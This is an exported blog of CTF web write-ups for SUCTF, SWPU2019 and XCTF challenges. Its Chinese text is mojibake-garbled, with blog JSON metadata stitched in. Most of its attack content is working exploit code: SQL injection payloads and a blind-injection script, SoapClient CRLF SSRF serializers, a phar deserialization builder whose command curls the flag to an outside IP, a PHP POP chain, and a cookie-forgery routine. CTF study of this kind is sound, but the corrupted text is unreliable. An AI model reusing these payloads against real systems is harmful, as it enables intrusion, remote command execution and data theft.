ä¸ºåå¼•å·+æ­£åˆ™æ›¿æ¢çš„ä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´äº†å¯æ³¨çš„åœ°æ–¹ï¼Œäºæ˜¯å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚å¤§æ¦‚æ˜¯è¿™ç§å½¢å¼å§ 11&#96; or sleep(3) ,1)# ä½†æ˜¯å°è¯•ç™»å½•æ—¶å´æç¤ºéœ€è¦ä»æœ¬åœ°ç™»è¿›ï¼Œè¿™å°±æ˜¯è¯´è¦ssrfäº†ã€‚æ€ä¹ˆè¾¾æˆå‘¢?å› ä¸ºæˆ‘ç¯å¢ƒæ‡’å¾—é‡å¼€äº†ï¼Œå€Ÿç”¨ä¸‹å…¶ä»–å¸ˆå‚…çš„å›¾è™½ç„¶å°†moodå‚æ•°è½¬intå¹¶addshalshesäº†ï¼Œä½†æ˜¯åé¢moodå‚æ•°åœ¨å¯ä»¥æ³¨å…¥çš„signnatureå‚æ•°åé¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ³¨å…¥å°†å…¶ç›´æ¥æ³¨é‡Šæ‰ï¼Œæ¥æ³¨å…¥ä¸€ä¸ªæˆ‘ä»¬çš„æ¶æ„åºåˆ—åŒ–å¯¹è±¡ç„¶åè°ƒç”¨äº†ä¸€ä¸ªgetcountry()æ–¹æ³•ï¼Œç»“åˆæˆ‘ä»¬ä¹‹å‰çš„éœ€æ±‚ï¼Œæ­£å¥½å¯ä»¥ä½¿ç”¨SoapClientã€‚åªè¦ä½¿ç”¨Soapæ„é€ ä¸€ä¸ªç™»é™†adminçš„è¯·æ±‚ï¼Œåºåˆ—åŒ–åæ’å…¥æ•°æ®åº“ï¼Œè¿™é‡Œè°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•æ—¶å°±èƒ½ç›´æ¥è§¦å‘__call()è¿›è€Œè§¦å‘ssrfã€‚ 1234567891011&lt;?php$target = \"http://127.0.0.1/index.php?action=login\";$post_string = 'username=admin&amp;password=jaivypassword&amp;code=4153792';$headers = array( 'Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2',);$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^','uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\r\\n\",$aaa);echo '0x'.bin2hex($aaa);?&gt; ç¨å¾®è§£é‡Šä¸‹è¦ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ssrfç™»å½•adminï¼Œé‚£ä¹ˆåˆ°æ—¶å€™ååºåˆ—åŒ–è§¦å‘å®Œäº†ï¼Œæˆ‘ä»¬è‡ªå·±ç™»è¿›å»ï¼Œéœ€è¦çš„å°±æ˜¯ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„cookieã€‚åŒæ—¶å› ä¸ºè¦æ„é€ çš„è¯·æ±‚å¿…é¡»æ˜¯ç™»å½•æ—¶åŒ…å«äº†adminçš„è´¦å·å¯†ç ä»¥åŠéªŒè¯ç çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦postè¯·æ±‚ã€‚è¿™é‡Œåˆä¸€æ¬¡ç”¨åˆ°CRLFï¼Œæ¥æ§åˆ¶Content-Typeï¼ŒContent-Length,è¾¾æˆpostè¯·æ±‚çš„æ¡ä»¶ã€‚ é‚£ä¹ˆæ­¤æ—¶æœ€å¥½é‡å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œç›´æ¥ä½¿ç”¨æ–°ç•Œé¢çš„cookieä»¥åŠç®—å¥½çš„éªŒè¯ç æ”¾åˆ°è„šæœ¬ä¸­ï¼Œå¾—åˆ°16è¿›åˆ¶çš„åºåˆ—åŒ–æ•°æ®ã€‚ç„¶ååœ¨å·²ç»ç™»å½•çš„ä½ç½®æ³¨å…¥åºåˆ—åŒ–æ•°æ®ã€‚è¿™æ—¶ä¼šè‡ªåŠ¨è·³åˆ°indexç•Œé¢ï¼Œè§¦å‘åºåˆ—åŒ–ã€‚ï¼ˆæˆ‘ç›´æ¥é‡åˆ°500,ä½†æ˜¯ä¸å½±å“ï¼‰ä¹‹åå†å›åˆ°åŸå…ˆæœªç™»å½•çš„åœ°æ–¹ç™»å½•å°±å¥½äº†ã€‚ åé¢çš„éƒ¨åˆ†ä¸æäº†ï¼Œæ˜¨å¤©åšäº†æˆ‘ä¸€ä¸‹åˆâ€¦â€¦å¯ä»¥å‚è€ƒèµµå¸ˆå‚…æˆ–è€…å…¶ä»–å¸ˆå‚…çš„wphttps://www.zhaoj.in/read-6170.htmlhttps://blog.csdn.net/chasingin/article/details/104687766 SUCTF UploadLabs2è¿™é¢˜ä¹Ÿæ˜¯ç»™å‡ºæºç ï¼Œç„¶åå®¡è®¡é¦–å…ˆæ˜¯Adç±»ä¸€ä¸ªè¯±äººçš„ææ„æ–¹æ³• 123function __destruct()&#123; system($this-&gt;cmd); &#125; æ¥çœ‹çœ‹è¾¾æˆæ¡ä»¶éœ€è¦ssrfï¼Œä¸ç”¨è¯´è¿™é‡Œåº”è¯¥åˆå¯ä»¥æƒ³åˆ°æˆ‘ä»¬çš„Soapç±»äº†ã€‚ç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„æ–¹æ³•ï¼Œå¾ˆå¿«åœ¨Fileç±»ä¸­æ‰¾åˆ° 12345function __wakeup()&#123; $class = new ReflectionClass($this-&gt;func); $a = $class-&gt;newInstanceArgs($this-&gt;file_name); $a-&gt;check();&#125; è¿™é‡ŒReflectionClassæ˜¯phpä¸­åå°„ç±»çš„æ„æ€ã€‚æ‰€ä»¥å…¶å®wakeupçš„å‰ä¸¤è¡Œå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡çš„ä½œç”¨ 12$class &#x3D; new ReflectionClass(&#39;Person&#39;); &#x2F;&#x2F; å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±» $instance &#x3D; $class-&gt;newInstanceArgs($args); &#x2F;&#x2F; ç›¸å½“äºå®ä¾‹åŒ–Person ç±» åŠ ä¸Šé‚£ä¸ª$a-&gt;check();æˆ‘ä»¬åŸºæœ¬ç¡®å®šè¿™é‡Œå°±æ˜¯ç”¨Soapç±»æ¥æ„é€ äº†ã€‚æ¥ä¸‹æ¥è”ç³»func.phpä¸­ä¼ å‚å®ä¾‹åŒ–Fileå¯¹è±¡çš„åšæ³•ï¼Œ 1234$file_path = $_POST['url']; $file = new File($file_path); $file-&gt;getMIME(); echo \"&lt;p&gt;Your file type is '$file' &lt;/p&gt;\"; ä¸éš¾æƒ³åˆ°ä½¿ç”¨pharæ¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¿™æ ·æˆ‘ä»¬çš„Fileç±»åœ¨å®ä¾‹åŒ–åï¼Œè¢«è§¦å‘ååºåˆ—åŒ–ï¼Œè°ƒç”¨__wakeup()ï¼Œåªè¦funcæ˜¯SoapClientå°±èƒ½è¿›è¡Œåç»­çš„ssrfï¼Œè¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚ 123456789101112131415161718192021222324252627&lt;?phpclass File&#123; public $file_name; public $func='SoapClient'; function __construct()&#123; $target = \"http://127.0.0.1/admin.php\"; $post_string = 'admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='. \"\\r\\n\"; $headers = []; $this-&gt;file_name=[ null, array('location' =&gt; $target, 'user_agent'=&gt;str_replace('^^', \"\\r\\n\",'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string.'^^') ,'uri'=&gt;'hello') ]; &#125;&#125;$a=new File();echo urlencode(serialize($a));@unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;script language='php'&gt; __HALT_COMPILER(); &lt;/script&gt;\"); //è®¾ç½®stub$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();rename('1.phar','1.jpg'); åŒæ ·æå‡ ä¸ªç»†èŠ‚ï¼š Soapçš„å‚æ•°ä¸­file_nameè¢«è®¾ä¸ºæ•°ç»„æ˜¯åå°„ç±»çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå®ƒæ¥æ”¶çš„æ˜¯æ•°ç»„å‚æ•°ã€‚ pharçš„æ–‡ä»¶åå·²ç»æ”¹æˆjpgäº†ï¼Œä½†æ˜¯ä¸ºäº†è¿‡ä¸€ä¸ªæ–‡ä»¶å¤´çš„æ ¡éªŒè¿˜å¾—è®¾å®š$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;); postæ•°æ®é™¤äº†cmdè·Ÿadminå¤–ï¼Œè¿˜è¦æ³¨æ„Adåœ¨ææ„å‰è°ƒç”¨çš„å¦å¤–ä¸€ä¸ªcheck()æ–¹æ³•ä¸­æ¥æ”¶çš„å‚æ•°ï¼Œä»–ä»¬éƒ½æ˜¯åå°„ç±»å®ä¾‹åŒ–çš„è€Œæˆ‘ä»¬åªéœ€è¦ä¼ å­˜åœ¨çš„ç±»è·Ÿæ–¹æ³•å³å¯ã€‚æ¯”å¦‚SplStackå°±æ˜¯phpæ ‡å‡†åº“é‡Œæ•°æ®ç»“æ„ç±»ï¼Œpushæ–¹æ³•ä¹Ÿæ˜¯è‡ªç„¶å­˜åœ¨çš„ã€‚æ‰€ä»¥ä¸Šä¼ 1.jpg,åœ¨func.phpè°ƒç”¨php://filter/resource=phar://upload/76d9f00467e5ee6abc3ca60892ef304e/f3ccdd27d2000e3f9255a7e3e2c48800.jpgè§¦å‘ååºåˆ—åŒ–ã€‚ è¿™é‡Œæˆ‘å¾€buuçš„requestsbinæ‰“payloadæ²¡æ”¶åˆ°ä¸æ­¢æ²¡æ”¶åˆ°ï¼Œç›´æ¥æ­»åœ¨æ–‡ä»¶æµé‚£äº†ã€‚å®ƒæŠ¥çš„æˆ‘æ–‡ä»¶æ˜¯ost-streamã€‚å‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚ ç”¨å®ƒçš„å†…ç½‘é¶æœºå°±æ²¡äº‹ï¼Ÿå¥½å§ï¼Œè¿˜æ˜¯æœ‰flagçš„hhh. SWPU2019 web6ä¸Šæ¥ä¸€ä¸ªsqlçš„ä¸‡èƒ½å¯†ç ï¼Œç”¨åˆ°äº†with rollupçš„trick1â€™ or â€˜1â€™=â€™1â€™ group by passwd with rollup having passwd is NULL â€“ -æ·»åŠ ä¸€ä¸ªç©ºåˆ—ï¼Œè¿›è¡Œç»“æœåˆ¤æ–­NULL=falseç»•è¿‡å¼±ç±»å‹ç›¸ç­‰ è¿›å»åå‘ç°wsdl.phpæä¾›äº†ä¸å°‘æ¥å£ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥è¯»æ–‡ä»¶æŠŠå¯è¯»çš„æ–‡ä»¶è¯»ä¸€ä¸‹index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243 &lt;?phpob_start();include (\"encode.php\");include(\"Service.php\");//error_reporting(0);//phpinfo();$method = $_GET['method']?$_GET['method']:'index';//echo 1231;$allow_method = array(\"File_read\",\"login\",\"index\",\"hint\",\"user\",\"get_flag\");if(!in_array($method,$allow_method))&#123; die(\"not allow method\");&#125;if($method===\"File_read\")&#123; $param =$_POST['filename']; $param2=null;&#125;else&#123; if($method===\"login\") &#123; $param=$_POST['username']; $param2 = $_POST['passwd']; &#125;else &#123; echo \"method can use\"; &#125;&#125;echo $method;$newclass = new Service();echo $newclass-&gt;$method($param,$param2);ob_flush();?&gt; Surface.php 123456&lt;?php include('Service.php'); $ser = new SoapServer('Service.wsdl',array('soap_version'=&gt;SOAP_1_2)); $ser-&gt;setClass('Service'); $ser-&gt;handle();?&gt; se.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpini_set('session.serialize_handler', 'php');class aa&#123; public $mod1; public $mod2; public function __call($name,$param) è°ƒç”¨å‡½æ•°ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°invoke &#123; if($this-&gt;&#123;$name&#125;) &#123; $s1 = $this-&gt;&#123;$name&#125;; $s1(); &#125; &#125; public function __get($ke) &#123; return $this-&gt;mod2[$ke]; &#125;&#125;class bb&#123; public $mod1; public $mod2; public function __destruct() å…¥æ‰‹ç‚¹ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°__call &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125; class cc&#123; public $mod1; public $mod2; public $mod3; public function __invoke() &#123; $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1; æ‹¼æ¥,é‚£ä¹ˆæœ‰å­—ç¬¦ä¸²äº† &#125; &#125;class dd&#123; public $name; public $flag; public $b; public function getflag() æ­¤å¤„å¯ssrfï¼Œåˆ°å¤´äº† &#123; session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-&gt;flag); echo call_user_func($this-&gt;b,$a); &#125;&#125;class ee&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;(); æœ‰å­—ç¬¦ä¸²äº†ï¼Œåªæœ‰ä»–èƒ½è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå½“ç„¶æ˜¯ssrf return \"1\"; &#125;&#125;$a = $_POST['aa'];unserialize($a);?&gt; encode.php 123456789101112131415161718192021222324252627&lt;?phpfunction en_crypt($content,$key)&#123; $key = md5($key); $h = 0; $length = strlen($content); $swpuctf = strlen($key); $varch = ''; for ($j = 0; $j &lt; $length; $j++) &#123; if ($h == $swpuctf) &#123; $h = 0; &#125; $varch .= $key&#123;$h&#125;; $h++; &#125; $swpu = ''; for ($j = 0; $j &lt; $length; $j++) &#123; $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256); &#125; return base64_encode($swpu);&#125; æ‰¾åˆ°ä¸å¯è¯»çš„æ–¹æ³• get_flagï¼Œå¾—çŸ¥è¦ç‚¹ï¼š get_flag only admin in 127.0.0.1 can get_flag ssrf needed POPchain needed decrypt and be admin å…ˆçœ‹popchain 12345bb-&gt;__destruct &#x2F;&#x2F;$mod1 ä¸ºaaå¯¹è±¡ -&gt;aa -&gt;_call()-&gt;$s1(); &#x2F;&#x2F;$éœ€è¦è°ƒç”¨çš„$s1æ˜¯ä¸ªå¯¹è±¡ -&gt;cc-&gt; __invoke()-&gt; &#x2F;&#x2F;æ‹¼æ¥ï¼Œéœ€è¦å±æ€§æ˜¯å­—ç¬¦ä¸² ee-&gt;_toString()-&gt; &#x2F;&#x2F;$str1æ˜¯ddå¯¹è±¡-&gt;getflag() dd-&gt;getflag() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass aa&#123; public $mod1; public $mod2;&#125;class bb&#123; public $mod1; public $mod2;&#125; class cc&#123; public $mod1; public $mod2; public $mod3;&#125;class dd&#123; public $name; public $flag; public $b;&#125;class ee&#123; public $str1; public $str2;&#125;$ee=new ee();$ee-&gt;str1=new dd();$ee-&gt;str2='getflag';$cc=new cc();$cc-&gt;mod3='1';$cc-&gt;mod1=$ee;$aa=new aa();$aa-&gt;mod1=$cc;$aa-&gt;mod2=array('test2'=&gt;&amp;$aa-&gt;mod1);$bb=new bb();$bb-&gt;mod1=$aa;$ee-&gt;str1-&gt;b='call_user_func';$ee-&gt;str1-&gt;flag='get_flag';$sa=serialize($bb);echo $sa; è¿™é¢˜ç±»ä¼¼bestphpâ€™srevengeï¼Œæ‰€ä»¥å‰é¢çš„é“¾å¥½äº†åå¯ä»¥ç›´æ¥æŠŠgetflag()ç”¨åˆ°çš„ä¸¤ä¸ªå‚æ•°å¡«å¥½ã€‚åŸç†æ˜¯ä¸€æ ·çš„ã€‚é“¾å­å¥½äº†,å›å¤´çœ‹çœ‹è§£ç  12345678910111213141516171819202122function de_crypt($swpu,$key)&#123; $swpu=base64_decode($swpu); $key=md5($key); $h=0; $length=strlen($swpu); $swpuctf=strlen($key); $varch=''; for($j=0;$j&lt;$length;$j++)&#123; if($h==$swpuctf) &#123; $h=0; &#125; $varch.=$key&#123;$h&#125;; $h++; &#125; $content=''; for($j=0;$j&lt;$length;$j++) &#123; $content.= chr(ord($swpu&#123;$j&#125;) - (ord($varch&#123;$j&#125;))+256 % 256); &#125; return $content;&#125; è§£ç cookieå¾—åˆ°xiaoC:3é‚£å°±åŠ å¯†ä¼ªé€ adminadmin:1 xZmdm9NxaQ== ç°åœ¨å·®ä¸€ä¸ªSopaæ‰“127.0.0.1è°ƒç”¨getflagéœ€è¦æ³¨æ„çš„æ˜¯interface.phpå·²ç»æœ‰ç°æˆçš„soapæ¥å£äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è®¿é—®index.phpè°ƒç”¨get_flagã€‚è€Œæ˜¯é€šè¿‡call_user_funcè°ƒç”¨SoapClientç±»çš„get_flagæ–¹æ³•å³è°ƒç”¨äº†Serviceç±»çš„get_flagæ–¹æ³•å…ˆå°†æ•°æ®å†™å…¥session 123456789101112&lt;?$target = 'http://127.0.0.1/interface.php';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: user=xZmdm9NxaQ==',);$b = new SoapClient(null, array('location' =&gt; $target, 'user_agent'=&gt;'byc^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers),'uri'=&gt;'aabb'));$a = serialize($b);$a = str_replace('^^', \"\\r\\n\", $a);echo $a;?&gt; åˆ©ç”¨è¡¨å•ä¼ è¿›session 123456789&lt;html&gt;&lt;body&gt; &lt;form action=\"http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"1\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; åŠ ä¸Šä¸Šé¢é“¾å­çš„payload.å³å¯get_flag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","slug":"XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","date":"2020-03-10T08:52:33.000Z","updated":"2021-02-18T05:09:58.785Z","comments":true,"path":"2020/03/10/XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›/","link":"","permalink":"https://www.bycsec.top/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"èŒæ–°ç¬¬ä¸€æ¬¡xctfè‡ªé—­äº†ã€‚ç¬¬ä¸€æ¬¡ä»£è¡¨X1cæ‰“æ¯”èµ›ï¼Œç»“æœè¾“å‡ºè´¼ä½ï¼Œå‡ ä¹å°±å®Œæ•´è´¡çŒ®ä¸€é“é¢˜ã€‚æœ‰å‡ é“åŸºæœ¬åˆ°ä½äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ²¡èƒ½åˆ†æ‹…é˜Ÿå‹å‹åŠ›â€¦..ä½†æ˜¯æœ€åé˜Ÿä¼æ‹¿åˆ°ç¬¬8åæŒºå¼ºçš„ï¼Œå…¶ä»–å¸ˆå‚…å¤ªç»™åŠ›äº†ï¼Œä¸­é—´æœ‰æ®µæ—¶é—´è¿˜å†²åˆ°äº†ç¬¬å››åï¼Œåªä¸è¿‡å¤§å®¶å› ä¸ºè¦ä¸Šè¯¾å°±éƒ½ç¡è§‰å»äº†hhhã€‚ æ‰€ä»¥è¶ç€å…¶ä»–æˆ˜é˜Ÿçš„wpå‡ºæ¥è‡ªå·±å…ˆæŠŠå‡ é“è‡ªå·±å½“æ—¶æ¥è§¦äº†çš„é¢˜ç›®ä»¥åŠæ²¡å®Œæ•´åšå‡ºæ¥çš„é¢˜ç›®å°ç»“ä¸‹ã€‚é¡ºä¾¿æé†’è‡ªå·±è¦åŠ ç´§æŸ¥æ¼è¡¥ç¼ºäº†ã€‚","text":"èŒæ–°ç¬¬ä¸€æ¬¡xctfè‡ªé—­äº†ã€‚ç¬¬ä¸€æ¬¡ä»£è¡¨X1cæ‰“æ¯”èµ›ï¼Œç»“æœè¾“å‡ºè´¼ä½ï¼Œå‡ ä¹å°±å®Œæ•´è´¡çŒ®ä¸€é“é¢˜ã€‚æœ‰å‡ é“åŸºæœ¬åˆ°ä½äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ²¡èƒ½åˆ†æ‹…é˜Ÿå‹å‹åŠ›â€¦..ä½†æ˜¯æœ€åé˜Ÿä¼æ‹¿åˆ°ç¬¬8åæŒºå¼ºçš„ï¼Œå…¶ä»–å¸ˆå‚…å¤ªç»™åŠ›äº†ï¼Œä¸­é—´æœ‰æ®µæ—¶é—´è¿˜å†²åˆ°äº†ç¬¬å››åï¼Œåªä¸è¿‡å¤§å®¶å› ä¸ºè¦ä¸Šè¯¾å°±éƒ½ç¡è§‰å»äº†hhhã€‚ æ‰€ä»¥è¶ç€å…¶ä»–æˆ˜é˜Ÿçš„wpå‡ºæ¥è‡ªå·±å…ˆæŠŠå‡ é“è‡ªå·±å½“æ—¶æ¥è§¦äº†çš„é¢˜ç›®ä»¥åŠæ²¡å®Œæ•´åšå‡ºæ¥çš„é¢˜ç›®å°ç»“ä¸‹ã€‚é¡ºä¾¿æé†’è‡ªå·±è¦åŠ ç´§æŸ¥æ¼è¡¥ç¼ºäº†ã€‚ nwebè¿™é“é¢˜åŸºæœ¬ç®—æ˜¯å®Œæ•´åšå‡ºæ¥äº†ã€‚åªæ˜¯è€ƒç‚¹æœ‰ç‚¹å‘ã€‚éƒ½çŸ¥é“æœ‰æ³¨å…¥ä½†æ˜¯å°±æ˜¯éš¾æ‰¾ã€‚å®é™…ä¸Šåœ¨æ³¨å†Œé¡µé¢æœ‰æ³¨é‡Šæé†’typeå‚æ•°110æ—¶ä¼šä¸ä¸€æ ·ã€‚å¹¶ä¸”ä¹‹å‰ç™»é™†è¿›å»é¡µé¢ä¸­æœ‰å‡ºé¢˜äººæç¤ºçš„â€æ³¨å†Œè´¦æˆ·ä¹Ÿæœ‰ç­‰çº§ä¹‹åˆ†â€ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ³¨å†Œæ—¶å°±å°†typeè°ƒä¸º110ã€‚ç™»é™†è¿›å»å°±å¯ä»¥åœ¨search.phpè¿›è¡Œæ³¨å…¥äº†ã€‚(ä½†æ˜¯è¿™ä¸ªåŒºåˆ†ç‚¹å°±å¾ˆæ— è¯­ï¼Œæ²¡å•¥å«é‡‘é‡ï¼Œåååˆèƒ½éš¾å€’ä¸€å †äºº) è¿›å»åä¸€ä¸ªæ™®é€šçš„ç›²æ³¨äº†ã€‚åªä¸è¿‡è¿‡æ»¤äº†å…³é”®å­—ç½®ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚ 12345678910111213141516171819202122import requestss=requests.session()url='http://121.37.179.47:1001/regist.php'url2='http://121.37.179.47:1001/login.php'url3='http://121.37.179.47:1001/search.php'flag=''s.post(url, data=&#123;'email': 'byc_409', 'pass': '123', 'repass': '123', 'type': '110'&#125;)for i in range(1,50): print(i) a=0 for j in range(32,128): s.post(url2, data=&#123;'email': 'byc_409', 'pass': '123'&#125;)#admin,fl4g,jd,user payload = \"1' or ascii(substr((selselectect group_concat(flag) frfromom fl4g),\"+str(i)+\",1))=\"+str(j)+\"#\" r = s.post(url3, data=&#123;'flag': payload&#125;) if 'no' not in r.text: flag+=chr(j) print(flag) a=1 break if a==0: break æ³¨å‡ºæ¥åªèƒ½å¾—åˆ°è´¦å·å¯†ç (md5)ï¼ŒåŠ ä¸Šä¸€ä¸ªåªæœ‰ä¸€éƒ¨åˆ†çš„flagã€‚åªèƒ½ç»§ç»­è¿›åå°äº†ã€‚ç”±äºä¹‹å‰æ‰«ç›®å½•å¾—åˆ°è¿‡admin.htmlã€‚ç›´æ¥ç™»å½•ï¼Œå‘ç°æ˜¯ä¸ªæ‰«æå™¨ç”±äºæˆ‘å‰å‡ å¤©æ‰æ¥å—çš„æ ¡é˜Ÿè€ƒæ ¸å°±æ˜¯mysql load data infileçš„çŸ¥è¯†ç‚¹ï¼ŒåŠ ä¸Šè·‘å‡ºæ¥çš„flagæ˜¯mysql-rogue-serverï¼Œé©¬ä¸Šå°±èƒ½æƒ³åˆ°ä½¿ç”¨Mysql-Rogue-Serverè§£å†³ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•å°±æ˜¯åœ¨æœåŠ¡å™¨è·‘è„šæœ¬å°±å®Œäº†ï¼Œä½†å…¶å®åŸç†æŒºéº»çƒ¦çš„ã€‚ç®€å•è§£é‡Šå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ load data infileçš„ç‰¹æ€§ï¼Œå¯ä»¥ç”¨è„šæœ¬ä¼ªé€ mysqlä¼ è¾“æ•°æ®åŒ…ã€‚åªè¦è¿™æ ·å°±èƒ½è¿”å›æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä¸è¿‡è¿™é¢˜pythonè„šæœ¬ä¸å¤§è¡Œçš„æ ·å­ï¼Œç”¨phpè„šæœ¬è§£å†³é—®é¢˜ï¼Œè¯»flag.phpå°±å¾—åˆ°å‰©ä¸‹çš„flagã€‚ PHP-UAFè¿™é¢˜åŸºæœ¬æ²¡å•¥æŠ€æœ¯éš¾åº¦ï¼Œä¸»è¦å°±æ˜¯è·‘è„šæœ¬äº†ã€‚æœ¬æ¥éšä¾¿æµ‹æµ‹çš„ï¼Œå‘ç°ç¦ç”¨ç³»ç»Ÿå‡½æ•°ä»¥åŠä¸€ä¸ªopen_basedirã€‚é‚£å°±çœ‹ä¸‹ç›®å½•å§ï¼Œå‘ç°çªç„¶å¤šäº†å¥½å¤šphpæ–‡ä»¶ï¼Œç»™å¸ˆå‚…çœ‹çœ‹å‘ç°å°±æ˜¯ä¸Šæ¬¡å…¬ç›Šèµ›easy_thinkingçš„bypassè„šæœ¬https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.phpé‚£å°±ç”¨å°±å®Œäº‹äº†ã€‚ç›´æ¥copyå‡½æ•°ç”¨äº†ååŒ…å«ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œå³å¯ã€‚è¿™é¢˜éƒå¸ˆå‚…éšæ‰‹åšçš„ï¼Œè²Œä¼¼å› ä¸ºæ…å±åŸå› åˆ·äº†åå‡ åˆ†é’Ÿæ‰å‡ºæ¥ã€‚è‡³äºä¸ºä»€ä¹ˆä¼šæ…å±ï¼Œéšä¾¿æ”¾ä¸€ä¸‹æ¯”èµ›æ—¶è¯»åˆ°çš„åˆ«é˜Ÿå¤§ä½¬phpå‘½ä»¤ easy_trick_gzmtuè¿™é¢˜ä¸æƒ³è¯´å•¥äº†ã€‚å°±æ˜¯å‘ã€‚èµ›åçœ‹çœ‹Nu1lçš„è§£é¢˜è„šæœ¬åï¼Œå‘ç°è¦ç”¨\\u\\n\\i\\o\\n \\s\\e\\l\\e\\c\\tè¿™ç§è¯­å¥ã€‚æ‰€ä»¥å®ƒæºç åº”è¯¥æ˜¯ç›´æ¥æŠŠå‚æ•°timeæ‹¿è¿›å‡½æ•°dateä¸€æŠŠæ¢­â€¦â€¦â€¦.. è¿™è°æƒ³å¾—åˆ°ï¼ŒçœŸçš„æ— è¯­ã€‚åé¢ä¸€ä¸ªååºåˆ—åŒ–çš„trick,ä¸æƒ³å¤šè¯´äº†ã€‚ å¥½å§ï¼Œå®˜æ–¹wpé‡Œå‘ç°è¿™é¢˜å‡ºé¢˜äººæ­åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œæ¥å¤ç°ä¸€æ³¢ã€‚æ³¨å…¥ä¸è¯´äº† 123456789101112131415161718import requestsimport urllib.parseimport stringimport relet=string.ascii_lowercase+\"_.()\"exp=''payload=\"1' union select 1,(select group_concat(passwd) from admin),3#\"# /eGlhb2xldW5nfor ch in payload: if ch in let: ch=\"\\\\\"+ch exp+=chprint(exp)url='http://eqwerqwrfweryu.mycute.cn/?time='r=requests.get(url+urllib.parse.quote(exp))page=re.findall(r'&lt;div class=\"text-c \"&gt;(.*?)&lt;/div&gt;',r.text)[0]print(page) ç„¶åä¸€ä¸ªssrfè¯»æºç ï¼Œfileåè®®åŠ localhostç›´æ¥è¯»ã€‚ä¼°è®¡è·Ÿhgame week2é‚£é¢˜ä¸€æ¨¡ä¸€æ ·çš„åç«¯ä»£ç ã€‚æ 